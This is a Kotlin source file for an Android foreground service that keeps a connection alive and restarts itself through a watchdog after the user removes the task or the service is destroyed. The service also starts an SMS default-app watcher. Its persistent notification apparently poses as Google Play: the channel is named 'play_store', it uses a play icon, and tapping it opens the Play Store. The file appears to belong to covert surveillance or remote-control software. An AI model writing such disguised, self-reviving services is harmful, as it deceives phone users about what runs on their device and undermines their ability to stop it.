package com.base.realtime.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.Uri
import android.os.Build
import android.os.IBinder
import android.util.Log
import com.base.realtime.R
import com.base.realtime.RealtimeApp
import com.base.realtime.engine.EngineState
import com.base.realtime.sms.SmsDefaultWatcher
import java.util.concurrent.atomic.AtomicBoolean
import kotlinx.coroutines.CoroutineExceptionHandler
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

/**
 * Persistent connection host. specialUse is intentional: dataSync cannot be
 * started from boot on Android 15 and is time-limited. A foreground service is
 * the supported way to keep a socket alive, including after the task is swiped away.
 */
class RealtimeService : Service() {
    private val handler = CoroutineExceptionHandler { _, t -> Log.w(TAG, "service scope", t) }
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main.immediate + handler)
    private var stateJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        running.set(true)
        try {
            createChannel()
            promoteForeground(EngineState())
        } catch (t: Throwable) {
            Log.e(TAG, "onCreate", t)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!RestartCoordinator.userUnlocked(this)) {
            stopSelf()
            return START_NOT_STICKY
        }
        if (!NetworkGate.isOnline(this)) {
            running.set(false)
            stopSelf()
            return START_NOT_STICKY
        }
        running.set(true)
        try {
            createChannel()
            val engine = RealtimeApp.engine(this)
            promoteForeground(engine.state.value)
            engine.ensureStarted()
            SmsDefaultWatcher.start(this)
            if (stateJob == null) {
                stateJob = scope.launch {
                    engine.state.collect { state ->
                        try {
                            notify(state)
                        } catch (t: Throwable) {
                            Log.w(TAG, "notify", t)
                        }
                    }
                }
            }
            Watchdog.scheduleBackup(this)
        } catch (t: Throwable) {
            Log.e(TAG, "onStartCommand", t)
            Watchdog.scheduleSoon(this)
        }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        try {
            Watchdog.scheduleBackup(this)
        } catch (t: Throwable) {
            Log.w(TAG, "onTaskRemoved", t)
        }
        super.onTaskRemoved(rootIntent)
    }

    @Suppress("unused")
    override fun onTimeout(startId: Int) {
        try {
            running.set(false)
            Watchdog.scheduleSoon(this)
        } catch (_: Throwable) {
        }
        stopSelf(startId)
    }

    override fun onDestroy() {
        val shouldResume = try {
            RestartCoordinator.hasIdentity(this)
        } catch (_: Throwable) {
            false
        }
        running.set(false)
        try {
            stateJob?.cancel()
            scope.cancel()
            RealtimeApp.engine(this).onServiceDestroyed()
        } catch (t: Throwable) {
            Log.w(TAG, "onDestroy", t)
        }
        super.onDestroy()
        if (shouldResume && NetworkGate.isOnline(this)) {
            Watchdog.scheduleSoon(this)
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun promoteForeground(state: EngineState) {
        val notification = notification(state)
        val type = if (Build.VERSION.SDK_INT >= 34) {
            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        } else {
            0
        }
        try {
            if (Build.VERSION.SDK_INT >= 34) {
                startForeground(NOTIFICATION_ID, notification, type)
            } else {
                @Suppress("DEPRECATION")
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (t: Throwable) {
            Log.e(TAG, "startForeground", t)
        }
    }

    private fun notify(state: EngineState) {
        val manager = getSystemService(NotificationManager::class.java) ?: return
        manager.notify(NOTIFICATION_ID, notification(state))
    }

    @Suppress("UNUSED_PARAMETER")
    private fun notification(state: EngineState): Notification {
        val open = PendingIntent.getActivity(
            this,
            0,
            playStoreIntent(),
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val builder = if (Build.VERSION.SDK_INT >= 26) {
            Notification.Builder(this, CHANNEL_ID)
        } else {
            @Suppress("DEPRECATION")
            Notification.Builder(this)
        }
        builder
            .setSmallIcon(R.drawable.ic_stat_play)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(getString(R.string.notification_text))
            .setContentIntent(open)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setShowWhen(false)
            .setColor(0xFF9E9E9E.toInt())
            .setCategory(Notification.CATEGORY_SERVICE)
        if (Build.VERSION.SDK_INT >= 31) {
            builder.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE)
        }
        return builder.build()
    }

    private fun playStoreIntent(): Intent {
        val launch = packageManager.getLaunchIntentForPackage("com.android.vending")
        if (launch != null) {
            return launch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        return Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store"))
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val manager = getSystemService(NotificationManager::class.java) ?: return
        val channel = NotificationChannel(
            CHANNEL_ID,
            getString(R.string.notification_channel),
            NotificationManager.IMPORTANCE_LOW,
        ).apply {
            description = getString(R.string.notification_channel_desc)
            setShowBadge(false)
        }
        manager.createNotificationChannel(channel)
    }

    companion object {
        private const val TAG = "Realtime"
        private const val CHANNEL_ID = "play_store"
        private const val NOTIFICATION_ID = 1001
        private val running = AtomicBoolean(false)

        fun isRunning(): Boolean = running.get()

        fun start(context: Context): Boolean {
            val app = context.applicationContext
            if (!NetworkGate.isOnline(app)) return false
            val intent = Intent(app, RealtimeService::class.java)
            return try {
                if (Build.VERSION.SDK_INT >= 26) {
                    app.startForegroundService(intent)
                } else {
                    app.startService(intent)
                }
                true
            } catch (t: Throwable) {
                Log.w(TAG, "foreground start not allowed", t)
                false
            }
        }

        fun stop(context: Context) {
            try {
                running.set(false)
                context.applicationContext.stopService(Intent(context, RealtimeService::class.java))
            } catch (t: Throwable) {
                Log.w(TAG, "stop", t)
            }
        }

        fun stopForNetwork(context: Context) {
            stop(context)
            NetworkGate.scheduleStartWhenOnline(context)
        }
    }
}
